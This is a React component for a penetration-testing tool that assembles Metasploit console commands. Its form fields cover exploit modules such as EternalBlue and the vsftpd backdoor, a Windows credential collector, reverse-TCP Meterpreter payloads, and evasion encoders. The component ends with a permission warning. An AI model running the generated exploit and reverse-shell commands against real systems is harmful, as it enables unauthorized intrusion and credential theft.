import { useState, useContext } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { FaCopy, FaInfoCircle, FaTerminal, FaShieldAlt } from 'react-icons/fa';
import { toast } from 'react-toastify';
import { useCommandHistory } from '../../contexts/CommandHistoryContext';
import { validateIpAddress, sanitizeInput } from '../../utils/commandHelpers';
import { copyToClipboard } from '../../utils/copyToClipboard';
import CommandHistory from '../UI/CommandHistory';

const MetasploitBuilder = () => {
  const [moduleType, setModuleType] = useState('exploit');
  const [modulePath, setModulePath] = useState('exploit/multi/handler');
  const [options, setOptions] = useState({
    rhost: '',
    rport: '80',
    lhost: '',
    lport: '4444',
    payload: 'windows/meterpreter/reverse_tcp',
    verbose: false,
    encoder: '',
    iterations: 1
  });
  const [showAdvanced, setShowAdvanced] = useState(false);
  const { addToHistory } = useCommandHistory();

  const moduleTypes = [
    { value: 'exploit', label: 'Exploit' },
    { value: 'auxiliary', label: 'Auxiliary' },
    { value: 'post', label: 'Post' },
    { value: 'payload', label: 'Payload' }
  ];

  const commonModules = {
    exploit: [
      { path: 'exploit/multi/handler', name: 'Multi Handler' },
      { path: 'exploit/windows/smb/ms17_010_eternalblue', name: 'EternalBlue (MS17-010)' },
      { path: 'exploit/unix/ftp/vsftpd_234_backdoor', name: 'VSFTPD v2.3.4 Backdoor' }
    ],
    auxiliary: [
      { path: 'auxiliary/scanner/portscan/tcp', name: 'TCP Port Scanner' },
      { path: 'auxiliary/scanner/smb/smb_version', name: 'SMB Version Detection' },
      { path: 'auxiliary/scanner/ssh/ssh_login', name: 'SSH Login Utility' }
    ],
    post: [
      { path: 'post/multi/manage/shell_to_meterpreter', name: 'Shell to Meterpreter Upgrade' },
      { path: 'post/windows/gather/credentials/credential_collector', name: 'Windows Credential Collector' }
    ],
    payload: [
      { path: 'payload/windows/meterpreter/reverse_tcp', name: 'Windows Meterpreter Reverse TCP' },
      { path: 'payload/linux/x86/meterpreter/reverse_tcp', name: 'Linux Meterpreter Reverse TCP' }
    ]
  };

  const payloads = [
    { value: 'windows/meterpreter/reverse_tcp', label: 'Windows Meterpreter Reverse TCP' },
    { value: 'windows/shell/reverse_tcp', label: 'Windows Shell Reverse TCP' },
    { value: 'linux/x86/meterpreter/reverse_tcp', label: 'Linux Meterpreter Reverse TCP' },
    { value: 'java/meterpreter/reverse_tcp', label: 'Java Meterpreter Reverse TCP' },
    { value: 'php/meterpreter/reverse_tcp', label: 'PHP Meterpreter Reverse TCP' }
  ];

  const encoders = [
    { value: '', label: 'None' },
    { value: 'x86/shikata_ga_nai', label: 'Shikata Ga Nai (x86)' },
    { value: 'x64/xor', label: 'XOR (x64)' },
    { value: 'cmd/echo', label: 'Echo (CMD)' }
  ];

  const buildCommand = () => {
    let commands = [
      'msfconsole',
      `use ${modulePath}`,
      `set RHOSTS ${options.rhost}`,
      `set RPORT ${options.rport}`,
      `set LHOST ${options.lhost}`,
      `set LPORT ${options.lport}`,
      `set PAYLOAD ${options.payload}`,
      options.verbose && 'set VERBOSE true',
      options.encoder && `set ENCODER ${options.encoder}`,
      options.encoder && options.iterations > 1 && `set ENCODER_ITERATIONS ${options.iterations}`,
      'run'
    ].filter(Boolean);
    
    return commands.join('\n');
  };

  const handleCopy = async () => {
    if (options.rhost && !validateIpAddress(options.rhost)) {
      toast.error('Please enter a valid RHOST IP address', {
        position: 'bottom-right',
        autoClose: 2000,
        hideProgressBar: true,
      });
      return;
    }

    if (options.lhost && !validateIpAddress(options.lhost)) {
      toast.error('Please enter a valid LHOST IP address', {
        position: 'bottom-right',
        autoClose: 2000,
        hideProgressBar: true,
      });
      return;
    }

    try {
      await copyToClipboard(buildCommand());
      addToHistory(buildCommand());
      toast.success('Command copied to clipboard!', {
        position: 'bottom-right',
        autoClose: 2000,
        hideProgressBar: true,
      });
    } catch (err) {
      toast.error('Failed to copy command', {
        position: 'bottom-right',
        autoClose: 2000,
        hideProgressBar: true,
      });
    }
  };

  const handleRhostChange = (e) => {
    setOptions({...options, rhost: sanitizeInput(e.target.value)});
  };

  const handleLhostChange = (e) => {
    setOptions({...options, lhost: sanitizeInput(e.target.value)});
  };

  return (
    <div className="command-builder">
      <div className="builder-header">
        <FaShieldAlt className="icon" />
        <h2>Metasploit Command Builder</h2>
        <p>Penetration testing framework</p>
      </div>
      
      <div className="form-group">
        <label>Module Type</label>
        <select 
          value={moduleType} 
          onChange={(e) => {
            setModuleType(e.target.value);
            setModulePath(commonModules[e.target.value][0].path);
          }}
          className="select-input"
        >
          {moduleTypes.map(type => (
            <option key={type.value} value={type.value}>
              {type.label}
            </option>
          ))}
        </select>
      </div>
      
      <div className="form-group">
        <label>Module Path</label>
        <select
          value={modulePath}
          onChange={(e) => setModulePath(e.target.value)}
          className="select-input"
        >
          {commonModules[moduleType].map(mod => (
            <option key={mod.path} value={mod.path}>
              {mod.name}
            </option>
          ))}
        </select>
      </div>
      
      <div className="form-group">
        <label>RHOST (Target IP)</label>
        <input
          type="text"
          value={options.rhost}
          onChange={handleRhostChange}
          placeholder="192.168.1.100"
          className="text-input"
        />
      </div>
      
      <div className="form-group">
        <label>RPORT (Target Port)</label>
        <input
          type="text"
          value={options.rport}
          onChange={(e) => setOptions({...options, rport: sanitizeInput(e.target.value)})}
          placeholder="80"
          className="text-input"
        />
      </div>
      
      <div className="form-group">
        <label>Payload</label>
        <select
          value={options.payload}
          onChange={(e) => setOptions({...options, payload: e.target.value})}
          className="select-input"
        >
          {payloads.map(payload => (
            <option key={payload.value} value={payload.value}>
              {payload.label}
            </option>
          ))}
        </select>
      </div>
      
      <div className="form-group">
        <label>LHOST (Your IP)</label>
        <input
          type="text"
          value={options.lhost}
          onChange={handleLhostChange}
          placeholder="192.168.1.1"
          className="text-input"
        />
      </div>
      
      <div className="form-group">
        <label>LPORT (Your Port)</label>
        <input
          type="text"
          value={options.lport}
          onChange={(e) => setOptions({...options, lport: sanitizeInput(e.target.value)})}
          placeholder="4444"
          className="text-input"
        />
      </div>
      
      <button 
        onClick={() => setShowAdvanced(!showAdvanced)}
        className="toggle-button"
      >
        {showAdvanced ? 'Hide Advanced Options' : 'Show Advanced Options'}
      </button>
      
      <AnimatePresence>
        {showAdvanced && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            exit={{ opacity: 0, height: 0 }}
            transition={{ duration: 0.3 }}
            className="advanced-options"
          >
            <div className="checkbox-group">
              <label>
                <input
                  type="checkbox"
                  checked={options.verbose}
                  onChange={(e) => setOptions({...options, verbose: e.target.checked})}
                />
                Verbose Output
              </label>
            </div>
            
            <div className="form-group">
              <label>Encoder</label>
              <select
                value={options.encoder}
                onChange={(e) => setOptions({...options, encoder: e.target.value})}
                className="select-input"
              >
                {encoders.map(encoder => (
                  <option key={encoder.value} value={encoder.value}>
                    {encoder.label}
                  </option>
                ))}
              </select>
            </div>
            
            {options.encoder && (
              <div className="form-group">
                <label>Encoder Iterations</label>
                <input
                  type="number"
                  min="1"
                  max="20"
                  value={options.iterations}
                  onChange={(e) => setOptions({...options, iterations: parseInt(e.target.value) || 1})}
                  className="text-input"
                />
              </div>
            )}
          </motion.div>
        )}
      </AnimatePresence>
      
      <div className="command-preview">
        <div className="preview-header">
          <h3>Generated Command</h3>
          <button onClick={handleCopy} className="copy-button">
            <FaCopy /> Copy
          </button>
        </div>
        <code>{buildCommand()}</code>
      </div>
      
      <CommandHistory />
      
      <div className="info-tip">
        <FaInfoCircle />
        <p>Warning: Metasploit should only be used on systems you own or have permission to test.</p>
      </div>
    </div>
  );
};

export default MetasploitBuilder;